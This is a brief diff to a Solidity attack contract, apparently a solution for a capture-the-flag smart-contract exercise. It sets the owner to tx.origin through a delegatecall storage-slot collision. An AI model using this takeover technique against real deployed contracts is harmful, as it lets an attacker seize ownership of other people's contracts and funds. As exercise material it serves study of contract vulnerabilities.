@@ -8,6 +8,6 @@ contract AttackPreservation {
     address public owner;
 
     function setTime(uint256 _time) public {
-        owner = 0x99DFADCD62593325BcF82ED1f55d87840E93a966;
+        owner = tx.origin;
     }
 }
